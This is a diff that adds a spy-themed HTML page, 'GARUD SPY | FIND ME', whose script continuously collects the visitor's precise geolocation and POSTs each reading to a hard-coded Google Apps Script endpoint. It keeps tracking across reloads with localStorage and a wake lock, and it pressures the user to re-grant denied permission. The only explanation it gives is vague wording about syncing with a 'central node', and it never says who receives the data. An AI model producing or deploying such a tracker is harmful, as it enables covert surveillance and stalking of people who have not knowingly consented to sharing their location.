@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GARUD SPY | FIND ME</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Space+Grotesk:wght@300;600&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --neon-green: #00ff9d;
+            --neon-blue: #00d4ff;
+            --bg-dark: #05070a;
+            --glass: rgba(15, 23, 42, 0.8);
+            --border: rgba(0, 255, 157, 0.2);
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Space Grotesk', sans-serif;
+            background-color: var(--bg-dark);
+            color: #e2e8f0;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ===== CYBER BACKGROUND ===== */
+        .grid-bg {
+            position: fixed;
+            inset: 0;
+            background-image: 
+                linear-gradient(var(--border) 1px, transparent 1px),
+                linear-gradient(90deg, var(--border) 1px, transparent 1px);
+            background-size: 50px 50px;
+            mask-image: radial-gradient(circle at 50% 50%, black, transparent 80%);
+            opacity: 0.15;
+            z-index: -1;
+        }
+
+        .glow-orb {
+            position: fixed;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(0, 255, 157, 0.1) 0%, transparent 70%);
+            top: -100px;
+            right: -100px;
+            z-index: -1;
+        }
+
+        /* ===== MAIN CONTAINER ===== */
+        .container {
+            width: 90%;
+            max-width: 400px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .hud-frame {
+            background: var(--glass);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 30px;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.5), inset 0 0 20px rgba(0, 255, 157, 0.05);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hud-frame::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 4px;
+            background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
+        }
+
+        /* ===== SCANNER ANIMATION ===== */
+        .scanner-box {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+        }
+
+        .radar-circle {
+            position: absolute;
+            inset: 0;
+            border: 1px solid var(--border);
+            border-radius: 50%;
+        }
+
+        .radar-sweep {
+            position: absolute;
+            inset: 0;
+            background: conic-gradient(from 0deg, var(--neon-green) 0deg, transparent 90deg);
+            border-radius: 50%;
+            opacity: 0.3;
+            animation: rotate 3s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== TYPOGRAPHY ===== */
+        h1 {
+            font-size: 1.2rem;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin: 0 0 5px;
+            color: var(--neon-green);
+            text-shadow: 0 0 10px rgba(0, 255, 157, 0.5);
+        }
+
+        .status-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: #64748b;
+            margin-bottom: 25px;
+            display: block;
+        }
+
+        /* ===== DATA READOUTS ===== */
+        .data-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .data-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 10px;
+            border-radius: 8px;
+        }
+
+        .data-val {
+            display: block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: var(--neon-blue);
+        }
+
+        .data-lbl {
+            font-size: 0.6rem;
+            color: #94a3b8;
+            text-transform: uppercase;
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn-primary {
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-family: 'JetBrains Mono', monospace;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 25px rgba(0, 255, 157, 0.5);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--neon-green);
+            border: 1px solid var(--neon-green);
+            margin-top: 10px;
+            width: 100%;
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+
+        /* ===== FOOTER STYLING ===== */
+        footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 15px 0;
+            background: linear-gradient(to top, rgba(5,7,10,0.9), transparent);
+            text-align: center;
+            z-index: 20;
+        }
+
+        .footer-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--neon-green);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            opacity: 0.8;
+            text-shadow: 0 0 8px rgba(0, 255, 157, 0.4);
+        }
+
+        /* ===== MODAL ===== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+        }
+
+        .modal-box {
+            background: #111;
+            border: 1px solid #f43f5e;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+<div class="grid-bg"></div>
+<div class="glow-orb"></div>
+
+<div class="container">
+    <div class="hud-frame">
+        <div class="scanner-box">
+            <div class="radar-circle"></div>
+            <div class="radar-circle" style="transform: scale(0.6)"></div>
+            <div class="radar-sweep" id="sweep"></div>
+        </div>
+
+        <h1>FIND ME</h1>
+        <span class="status-label" id="pillText">STANDBY_MODE</span>
+  <span class="status-label" id="pillText">BY : GARUD SPY</span>
+
+        <div id="statusArea" class="hidden">
+            <div class="data-grid">
+                <div class="data-card">
+                    <span class="data-lbl">Latitude</span>
+                    <span class="data-val" id="lat">0.0000</span>
+                </div>
+                <div class="data-card">
+                    <span class="data-lbl">Longitude</span>
+                    <span class="data-val" id="lng">0.0000</span>
+                </div>
+            </div>
+            
+            <div style="margin-bottom: 20px;">
+                <span class="data-lbl">Uplink Status</span>
+                <div id="msg" style="color: var(--neon-green); font-family: 'JetBrains Mono'; font-size: 0.8rem;">Awaiting Data...</div>
+            </div>
+        </div>
+
+        <button id="startBtn" class="btn-primary">INITIALIZE LINK</button>
+        <button id="enableBtn" class="btn-secondary hidden">RE-AUTHORIZE SENSORS</button>
+    </div>
+</div>
+
+<footer>
+    <div class="footer-text">MADE BY JAIMIN PARMAR</div>
+</footer>
+
+<div id="locationPopup" class="modal-overlay hidden">
+    <div class="modal-box">
+        <h3 style="color: #f43f5e; margin-top: 0;">SIGNAL BLOCKED</h3>
+        <p style="font-size: 0.8rem; color: #94a3b8;">Location permissions are required to sync with the central node.</p>
+        <button class="btn-primary" style="background: #f43f5e;" onclick="retrySync()">RETRY AUTH</button>
+    </div>
+</div>
+
+<script>
+    const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbzHhjF-_78h2N3QiSAOGtF00GyUOWKxqLdkoAMp34xUMOT4VYjeJ56Ipp_ePglvLO5d/exec';
+
+    const startBtn = document.getElementById('startBtn');
+    const enableBtn = document.getElementById('enableBtn');
+    const statusArea = document.getElementById('statusArea');
+    const locationPopup = document.getElementById('locationPopup');
+    const msg = document.getElementById('msg');
+    const latDisp = document.getElementById('lat');
+    const lngDisp = document.getElementById('lng');
+    const pillText = document.getElementById('pillText');
+    const sweep = document.getElementById('sweep');
+
+    let watchId = null;
+    let wakeLock = null;
+
+    async function checkPermissions() {
+        if (!navigator.permissions) return;
+        try {
+            const permission = await navigator.permissions.query({name:'geolocation'});
+            const updateUI = () => {
+                if (permission.state === "granted") {
+                    locationPopup.classList.add("hidden");
+                    enableBtn.classList.add("hidden");
+                    if (localStorage.getItem("isTracking") === "true") startTracking();
+                } else if (localStorage.getItem("isTracking") === "true") {
+                    enableBtn.classList.remove("hidden");
+                    pillText.innerText = "SYNC_PAUSED";
+                    sweep.style.animationPlayState = 'paused';
+                }
+            };
+            updateUI();
+            permission.onchange = updateUI;
+        } catch(e) {}
+    }
+
+    async function requestWakeLock(){
+        try { if('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen'); } catch(e){}
+    }
+
+    function sendToSheet(pos){
+        locationPopup.classList.add("hidden");
+        enableBtn.classList.add("hidden");
+        
+        latDisp.innerText = pos.coords.latitude.toFixed(4);
+        lngDisp.innerText = pos.coords.longitude.toFixed(4);
+        pillText.innerText = "LINK_ACTIVE";
+        sweep.style.animationPlayState = 'running';
+
+        const payload = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+        };
+
+        fetch(WEB_APP_URL, {
+            method:"POST",
+            mode:"no-cors",
+            body:JSON.stringify(payload)
+        }).then(() => {
+            msg.innerText = "DATA_SENT: " + new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+        }).catch(() => {
+            msg.innerText = "CONNECTION_ERROR";
+        });
+    }
+
+    function handleSyncError(err){
+        if(err.code === 1){
+            pillText.innerText = "AUTH_REQUIRED";
+            enableBtn.classList.remove("hidden");
+            locationPopup.classList.remove("hidden");
+        } else {
+            pillText.innerText = "SIGNAL_SEARCHING...";
+        }
+    }
+
+    async function startTracking(){
+        localStorage.setItem("isTracking", "true");
+        startBtn.classList.add("hidden");
+        statusArea.classList.remove("hidden");
+        
+        await requestWakeLock();
+
+        if(watchId) navigator.geolocation.clearWatch(watchId);
+
+        watchId = navigator.geolocation.watchPosition(sendToSheet, handleSyncError, {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 15000
+        });
+    }
+
+    function retrySync() {
+        locationPopup.classList.add("hidden");
+        startTracking();
+    }
+
+    enableBtn.addEventListener('click', startTracking);
+    startBtn.addEventListener("click", startTracking);
+
+    window.addEventListener("load", () => {
+        checkPermissions();
+        if(localStorage.getItem("isTracking") === "true") startTracking();
+    });
+
+    document.addEventListener("visibilitychange", async () => {
+        if(document.visibilityState === "visible"){
+            await requestWakeLock();
+            checkPermissions(); 
+        }
+    });
+</script>
+
+</body>
+</html>
